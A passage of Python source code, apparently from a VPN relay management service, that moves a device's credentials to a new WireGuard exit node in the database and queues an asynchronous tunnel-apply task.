        old_exit_id = first_cred.exit_id if first_cred is not None else None
        if old_exit_id == new_exit_id:
            raise RuntimeError(
                "device is already routed through this exit"
            )

        self.db.query(models.Credential).filter(
            models.Credential.device_id == device.id
        ).update(
            {models.Credential.exit_id: new_exit_id},
            synchronize_session=False,
        )
        self.db.flush()

        task = self.create_task(
            "relay_tunnel",
            node.id,
            "apply",
            {
                "exit_id": new_exit_id,
                "switch_device_id": device.id,
                "new_exit_id": new_exit_id,
                "new_interface": link.wg_interface_name,
            },
        )
        self.db.commit()
        self.run_task_async(task)
        return old_exit_id, link.wg_interface_name, [task]
